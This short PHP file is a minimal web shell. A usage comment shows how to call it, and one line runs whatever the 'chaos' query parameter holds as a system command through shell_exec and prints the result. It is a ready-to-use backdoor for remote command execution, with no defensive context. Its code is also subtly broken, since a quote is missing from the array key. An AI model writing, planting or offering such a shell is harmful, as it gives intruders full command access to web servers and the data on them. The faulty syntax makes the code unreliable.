// usage: phpcmd.php?chaos=whoami

<?php echo shell_exec($_GET[chaos'].' 2>&1'); ?>
